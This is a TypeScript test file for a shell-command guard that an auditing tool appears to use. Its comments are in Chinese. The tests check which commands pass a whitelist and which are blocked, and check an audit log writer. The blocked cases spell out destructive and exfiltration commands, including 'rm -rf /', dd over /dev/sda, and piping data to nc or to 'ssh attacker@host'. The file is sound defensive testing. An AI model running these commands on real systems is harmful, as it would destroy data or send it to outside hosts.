import { describe, it, expect, afterAll } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { assertCommandSafe, appendAuditLog } from '../src/guard.js';

// 测试过程中产生的临时目录统一清理
const tmpDirs: string[] = [];
afterAll(() => {
  for (const d of tmpDirs) fs.rmSync(d, { recursive: true, force: true });
});

function expectBlocked(cmd: string): void {
  const r = assertCommandSafe(cmd);
  expect(r.ok, `命令应被拦截: ${cmd} (实际结果 ${JSON.stringify(r)})`).toBe(false);
  expect(r.blockedSegment).toBeTruthy();
  expect(r.reason).toBeTruthy();
}

function expectOk(cmd: string): void {
  const r = assertCommandSafe(cmd);
  expect(r.ok, `命令应放行: ${cmd} (实际结果 ${JSON.stringify(r)})`).toBe(true);
}

describe('assertCommandSafe 白名单放行', () => {
  it('1. systemctl status sshd → 放行', () => {
    expectOk('systemctl status sshd');
  });

  it('2. cat /etc/passwd → 放行', () => {
    expectOk('cat /etc/passwd');
  });

  it('3. cat /etc/passwd | grep root → 管道两段均在白名单，放行', () => {
    expectOk('cat /etc/passwd | grep root');
  });

  it('10. ls -la 2>/dev/null → 唯一允许的重定向例外，放行', () => {
    expectOk('ls -la 2>/dev/null');
  });

  it('13. ping -c 1 127.0.0.1 → 放行', () => {
    expectOk('ping -c 1 127.0.0.1');
  });

  it('14. echo hello world → 放行', () => {
    expectOk('echo hello world');
  });

  it('17a. crontab -l → 放行', () => {
    expectOk('crontab -l');
  });

  it('18a. find /etc -name sshd_config → 放行', () => {
    expectOk('find /etc -name sshd_config');
  });

  it('20. awk \'{print $1}\' /etc/passwd → 放行', () => {
    expectOk("awk '{print $1}' /etc/passwd");
  });
});

describe('assertCommandSafe 危险命令拦截', () => {
  it('4. ls; rm -rf / → 拆段后第二段 rm 被拦截', () => {
    expectBlocked('ls; rm -rf /');
  });

  it('5. cat x > /etc/passwd → 重定向被拦截', () => {
    expectBlocked('cat x > /etc/passwd');
  });

  it('6. cat $(rm -rf /tmp/x) → 命令替换 $( 被拦截', () => {
    expectBlocked('cat $(rm -rf /tmp/x)');
  });

  it('7. cat `whoami` → 反引号被拦截', () => {
    expectBlocked('cat `whoami`');
  });

  it('8. systemctl stop sshd → 变更类 systemctl 被拦截', () => {
    expectBlocked('systemctl stop sshd');
  });

  it('9. reboot → 拦截', () => {
    expectBlocked('reboot');
  });

  it('11. ls -la 2>&1 → 非例外重定向被拦截', () => {
    expectBlocked('ls -la 2>&1');
  });

  it('12. dd if=/dev/zero of=/dev/sda → 拦截', () => {
    expectBlocked('dd if=/dev/zero of=/dev/sda');
  });

  it('15. echo x | bash → 第二段 bash 被拦截', () => {
    expectBlocked('echo x | bash');
  });

  it('16. export PATH=/tmp → 拦截', () => {
    expectBlocked('export PATH=/tmp');
  });

  it('17b. crontab -r → 不在白名单被拦截', () => {
    expectBlocked('crontab -r');
  });

  it('18b. find /etc -name x -delete → -delete 被拦截', () => {
    expectBlocked('find /etc -name x -delete');
  });

  it('19. su - root → 拦截', () => {
    expectBlocked('su - root');
  });
});

describe('assertCommandSafe 边界补充', () => {
  it('空命令与纯分隔符 → 放行（无危险段）', () => {
    expectOk('');
    expectOk('   ');
    expectOk(';;;');
  });

  it('路径中包含 ssh（如 /etc/ssh/sshd_config）不误伤 → 放行', () => {
    expectOk("grep -E '^PermitRootLogin' /etc/ssh/sshd_config");
    expectOk("grep -E '^\\s*PermitEmptyPasswords\\s+yes' /etc/ssh/sshd_config");
  });

  it('ssh/curl 作为命令被调用仍拦截（含管道与独立调用）', () => {
    expectBlocked('echo x | ssh attacker@host');
    expectBlocked('ssh target');
    expectBlocked('curl http://example.com');
    expectBlocked('scp file target:/tmp');
    expectBlocked('echo data | nc 127.0.0.1 4444');
  });

  it('passwd 作为命令调用被拦截，路径 /etc/passwd 放行', () => {
    expectOk('cat /etc/passwd');
    expectBlocked('passwd root');
    expectBlocked('echo x | passwd');
  });

  it('多分隔符混合拆段：cat a;;ls -la && ps aux || echo hi → 放行', () => {
    expectOk('cat a;;ls -la && ps aux || echo hi');
  });

  it('引号内的 | 不是管道：grep -E 交替正则不拆段 → 放行', () => {
    expectOk("grep -E '^password\\s+(requisite|required)\\s+pam_pwquality.so' /etc/pam.d/system-auth");
    expectOk("grep -Ei 'PermitRootLogin\\s+(no|prohibit-password)' /etc/ssh/sshd_config");
  });

  it('引号外的管道照常拆段拦截：echo x | reboot → 拦截', () => {
    expectBlocked("echo 'hello' | reboot");
  });

  it('多分隔符混合拆段：cat a; ls; reboot → 第三段拦截且 blockedSegment=reboot', () => {
    const r = assertCommandSafe('cat a; ls; reboot');
    expect(r.ok).toBe(false);
    expect(r.blockedSegment).toBe('reboot');
  });

  it('段内黑名单子串：grep -c root /etc/passwd 之外混入 xargs → 拦截', () => {
    expectBlocked('ls | xargs cat');
  });

  it('重定向 << 与 >> 均被拦截', () => {
    expectBlocked('cat x >> /tmp/a');
    expectBlocked('wc -l < /etc/passwd');
  });
});

describe('appendAuditLog JSONL 审计日志', () => {
  it('21. 写2条后文件恰好2行 JSON、字段完整、可被 JSON.parse', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'audit-pilot-guard-'));
    tmpDirs.push(dir);
    const logPath = path.join(dir, 'audit-log.jsonl');

    appendAuditLog(logPath, { time: '2026-10-09T10:00:00Z', command: 'cat /etc/passwd', ok: true });
    appendAuditLog(logPath, {
      time: '2026-10-09T10:00:01Z',
      command: 'reboot',
      ok: false,
      reason: '包含危险片段: reboot',
    });

    const content = fs.readFileSync(logPath, 'utf8');
    const lines = content.split('\n');
    // 恰好 2 行：最后一行可能是结尾换行产生的空串
    expect(lines.filter((l) => l.trim() !== '').length).toBe(2);
    expect(content.endsWith('\n')).toBe(true);

    const first = JSON.parse(lines[0]) as Record<string, unknown>;
    expect(first).toEqual({
      time: '2026-10-09T10:00:00Z',
      command: 'cat /etc/passwd',
      ok: true,
    });

    const second = JSON.parse(lines[1]) as Record<string, unknown>;
    expect(second.command).toBe('reboot');
    expect(second.ok).toBe(false);
    expect(typeof second.reason).toBe('string');
  });
});
